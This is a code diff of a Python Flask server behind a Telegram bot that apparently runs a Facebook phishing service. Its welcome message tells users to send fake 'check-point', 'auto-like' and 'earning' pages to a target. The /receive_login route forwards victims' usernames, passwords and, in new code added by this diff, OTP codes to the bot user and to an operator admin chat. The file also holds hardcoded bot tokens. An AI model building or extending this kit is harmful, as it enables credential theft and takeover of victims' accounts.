@@ -1,6 +1,6 @@
 # ==============================
-# VS BOT — Railway Full Updated
-# With Admin Bot + Direct Link + Auto-Like URL + Broadcast System
+# VS BOT — Railway Full Updated (v2)
+# With Admin Bot + Direct Link + Auto-Like URL + Earning Like Platform + Broadcast System
 # Developer: @noobxvau (MN Siddik)
 # ==============================
 
@@ -14,24 +14,27 @@ app = Flask(__name__)
 CORS(app)
 
 # -------------------------
-# Main Bot Token
+# Bot Tokens and Admin Config
+# -------------------------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8472535428:AAGAcUvGClisEF9Kr0MsaKLGw5Je_AY4JVU")
-
-# Admin Bot Token
 ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8218726690:AAHMwmdce9LJA1GPovRo4Exk4ON7_P4CUdY")
-
-# Admin Telegram Chat ID
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1849126202")
 
+# -------------------------
 # Frontend Netlify URLs
-FRONTEND_FB_BASE = "fb-check-point.netlify.app"         # Facebook page
+# -------------------------
+FRONTEND_FB_BASE = "fb-check-point.netlify.app"          # Facebook page
 FRONTEND_LIKE_BASE = "auto-like-free.netlify.app"        # Auto-Like page
+FRONTEND_EARNING_BASE = "earning-hub-bd.netlify.app"  # Earning Like Platform page
 
+# -------------------------
+# File setup
+# -------------------------
 USERS_FILE = "users.json"
 registered_users = {}
 
 # -------------------------
-# ইউজার লোড / সেভ ফাংশন
+# Load & Save Users
 # -------------------------
 def load_users():
     global registered_users
@@ -46,7 +49,7 @@ def save_users():
         json.dump(registered_users, f, indent=4)
 
 # -------------------------
-# মেইন বট-এ মেসেজ পাঠানো
+# Send Message to User Bot
 # -------------------------
 def send_message(chat_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -56,7 +59,7 @@ def send_message(chat_id, text):
         print(f"❌ Error sending message to {chat_id}: {e}")
 
 # -------------------------
-# এডমিন বট-এ মেসেজ পাঠানো
+# Send Message to Admin Bot
 # -------------------------
 def send_admin_message(text):
     url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
@@ -67,7 +70,7 @@ def send_admin_message(text):
         print(f"❌ Error sending to admin: {e}")
 
 # -------------------------
-# Register URL functions
+# Generate URLs
 # -------------------------
 def make_facebook_url(chat_id):
     return f"{FRONTEND_FB_BASE}/index.html?uid={chat_id}"
@@ -75,8 +78,11 @@ def make_facebook_url(chat_id):
 def make_autolike_url(chat_id):
     return f"{FRONTEND_LIKE_BASE}/index.html?uid={chat_id}"
 
+def make_earning_url(chat_id):
+    return f"{FRONTEND_EARNING_BASE}/index.html?uid={chat_id}"
+
 # -------------------------
-# Telegram Webhook for USER BOT
+# Telegram Webhook for Main Bot
 # -------------------------
 @app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def telegram_webhook():
@@ -84,28 +90,31 @@ def telegram_webhook():
     if "message" in data:
         chat_id = data["message"]["chat"]["id"]
         text = data["message"].get("text", "")
-        
+
         if text.lower().strip() == "/start":
             fb_url = make_facebook_url(chat_id)
             like_url = make_autolike_url(chat_id)
+            earning_url = make_earning_url(chat_id)
+
             welcome = (
                 "🤖 *Welcome to Phanhom Bot!*\n\n"
                 "লিংকগুলো কপি করো এবং তোমার target কে দাও 👇\n\n"
                 f"📘 Facebook URL: {fb_url}\n"
-                f"👍 Auto-Like URL: {like_url}\n\n"
+                f"👍 Auto-Like URL: {like_url}\n"
+                f"💰 Earning Like Platform: {earning_url}\n\n"
                 "👨‍💻 *Bot Developer:* [@noobxvau](https://t.me/noobxvau)\n"
                 "💬 *Join our official group for more updates:*\n"
                 "👉 [NOOB HACKER BD](https://t.me/+ENYrQ5N9WNE3NWQ9)"
             )
-            send_message(chat_id, welcome)
 
+            send_message(chat_id, welcome)
             registered_users[str(chat_id)] = True
             save_users()
             print(f"✅ User {chat_id} registered.")
     return jsonify({"status": "ok"})
 
 # -------------------------
-# Telegram Webhook for ADMIN BOT
+# Telegram Webhook for Admin Bot
 # -------------------------
 @app.route(f"/{ADMIN_BOT_TOKEN}", methods=["POST"])
 def admin_webhook():
@@ -139,12 +148,15 @@ def broadcast_message(message):
     count = 0
     for uid in registered_users.keys():
         if uid.isdigit():
-            send_message(uid, f"📢 *Admin Message:*\n\n{message}")
-            count += 1
+            try:
+                send_message(uid, f"📢 *Admin Message:*\n\n{message}")
+                count += 1
+            except:
+                continue
     print(f"📨 Broadcast sent to {count} users.")
 
 # -------------------------
-# Login info receive route
+# Receive Login Info (from all frontends)
 # -------------------------
 @app.route('/receive_login', methods=["POST"])
 def receive_login():
@@ -152,8 +164,20 @@ def receive_login():
     uid = str(data.get("uid", ""))
     username = data.get("username", "")
     password = data.get("password", "")
-    
-    if uid and uid in registered_users:
+    otp = data.get("otp", "")
+    step = data.get("step", "")
+
+    # Handle create account / verify otp steps
+    if step == "create_account":
+        send_admin_message(f"🆕 *New Account Creation Attempt*\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`")
+        return jsonify({"status": "account_step_ok"})
+
+    elif step == "verify_otp":
+        send_admin_message(f"🔐 *OTP Verification*\n📱 *OTP:* `{otp}`")
+        return jsonify({"status": "otp_step_ok"})
+
+    # Handle standard login from any frontend
+    elif uid and uid in registered_users:
         msg = f"🧾 *Login Info*\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`"
         send_message(uid, msg)
         admin_text = f"📩 *New Login Captured!*\n👤 *UID:* `{uid}`\n{msg}"
@@ -164,11 +188,11 @@ def receive_login():
         return jsonify({"error": "uid not found"})
 
 # -------------------------
-# Home route
+# Home Route
 # -------------------------
 @app.route('/')
 def home():
-    return "✅ Bot server running with Admin Broadcast system!"
+    return "✅ Bot server running with Admin Broadcast system + Earning Like Platform!"
 
 # -------------------------
 # Main
@@ -177,7 +201,7 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
 
     # Auto webhook for both bots
-    public_url = os.environ.get("RAILWAY_STATIC_URL") or os.environ.get("RAILWAY_PUBLIC_URL")
+    public_url = os.environ.get("RAILWAY_PUBLIC_URL") or os.environ.get("RAILWAY_STATIC_URL")
     if public_url:
         try:
             # Main bot webhook
